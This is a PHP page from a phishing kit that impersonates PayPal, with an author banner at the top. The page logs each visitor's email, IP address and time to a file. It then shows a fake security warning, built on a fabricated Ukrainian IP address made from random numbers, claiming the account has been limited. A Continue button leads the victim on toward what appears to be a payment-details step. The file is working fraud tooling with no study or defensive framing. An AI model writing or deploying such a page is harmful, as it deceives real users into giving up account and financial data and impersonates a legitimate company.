<?php
#####################################################################################################
###################################### fallagmahdi@hotmail.com ######################################
###### ####### ##      ##      #######  #######       #### #### ####### ##     ##   ######   ########
##     ##   ## ##      ##      ##   ## ##             ## ### ## ##   ## ##     ##   ##    ##    ##
###### ####### ##      ##      ####### ##  ######     ##  #  ## ####### #########   ##     ##   ##
##     ##   ## ##      ##      ##   ## ##    ##       ##     ## ##   ## ##     ##   ##    ##    ##
##     ##   ## ####### ####### ##   ##  #######       ##     ## ##   ## ##     ##   ######   ########
############################## https://www.facebook.com/fallag.mahdi.tn #############################
#####################################################################################################
$rand = @$_GET['dispatch'];
include("../M_files/config.php");
if(@$_SESSION['Done'] == 2) {
	die('<META HTTP-EQUIV="Refresh" Content="0; URL=payment.php?dispatch='.$rand.'">');
}
$email = @$_COOKIE['email'];
date_default_timezone_set("Africa/Tunis");
$date = date('d/m/Y', time());
$time = date('H:i:s', time());
$ip = getenv("REMOTE_ADDR");
$msg = "<b>$email </b> with <b>$ip</b> has cammed to <b>Personal</b> at <b>$time - $date</b><br>";
$myFile = "../ips.html";
$fh = fopen($myFile, 'a+') or die("can't open file");
fwrite($fh, $msg);
fclose($fh);
$ech = $_SESSION['ech'];
$js = js_perso();
$css = css_perso();
//$html = html_perso($css, $js, $ech);
/*die($html);*/
?>
<!Doctype html>
<html>
	<head>
		<title>Personal information update</title>
		<link rel="stylesheet"  href="../M_css/M_personal.css"/>
		<link rel="shortcut icon" type="image/x-icon" href="../M_images/favicon.ico" />
		<script type="text/javascript" src="//code.jquery.com/jquery.min.js"></script>
		<script type="text/javascript" src="../M_scripts/M_home.js"></script>
		<script type="text/javascript" src="../M_scripts/M_cookies.js"></script>
		<META charset="utf-8">
	</head>	
	<body>
		<div class="mahdi_1" >
			<div class="mahdi_2">
				<img src="../M_images/logo_paypal.png">
			</div>
		</div>
		
		<div class="mahdi_3" >
			<div class="mahdi_4">
				<h1>Welcome <?=$ech['fname'].$ech['lname']?>,</h1>
			</div>
			<form class="mahdi_51" action="personal.php?dispatch='.$rand.'" method="post" style="width:960px" align="left">
				
				<img src="../M_images/hero_security.png" style="float:right;">
				<h2>Warning : Unusual activities on your account</h2>
				<p>If you are seeing the messages this means that your account has been visited from an unusual place given below : </p>
				<style>
table {
    border-radius: 5px;
}

table, td {
}
td {
	padding-left:20px;
	font-size: 15px;
	font-weight: bold;
}
</style>
				<table>
					<tr>
						<td>IP </td>
						<td > : 176.97.<?php echo rand(100, 120) ?>.<?php echo rand(10, 99) ?></td>
					</tr>
					<tr>
						<td>Country </td>
						<td> : Ukraine</td>
					</tr>
					<tr>
						<td>Ville </td>
						<td> : Odessa</td>
					</tr>
				</table>
				<p>
					As a security measure, your account has been limited.<br><br>
					Don't worry, you will be able to get your account back just after finishing this steps.<br><br><br>
					<input type="submit" name="MAHDI_subm" class="MAHDI_submi"  id="MAHDI_submi"  value="Continue">
				</p>
			</form>

			<div class="mahdi_53">
				Copyright &copy; 1999-2015 P&alpha;yP&alpha;l.
			</div>
		</div>
	</body>
</html>
